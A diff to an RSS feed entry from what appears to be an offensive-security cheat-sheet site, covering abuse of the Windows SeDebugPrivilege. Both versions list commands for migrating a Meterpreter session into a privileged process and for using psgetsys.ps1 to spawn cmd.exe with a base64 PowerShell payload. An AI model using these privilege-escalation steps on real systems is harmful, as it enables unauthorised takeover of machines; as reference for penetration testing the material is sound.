@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/sedebugprivilege/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sedebugprivilege/</guid>
-      <description> Abuse #1: Meterpreter Migrate # Inside meterpreter ps winlogon migrate &amp;lt;PID&amp;gt; Abuse #2 : psgetsys.ps1 psgetsys&#xA;# Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;powershell #3 Base64&amp;gt;&amp;#34; </description>
+      <description>Tools Metasploit psgetsys.ps1 # Inside meterpreter ps winlogon # Explorer.exe is a good candidate migrate &amp;lt;PID&amp;gt; # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;powershell #3 Base64&amp;gt;&amp;#34; Ref: psgetsys</description>
     </item>
   </channel>
 </rss>
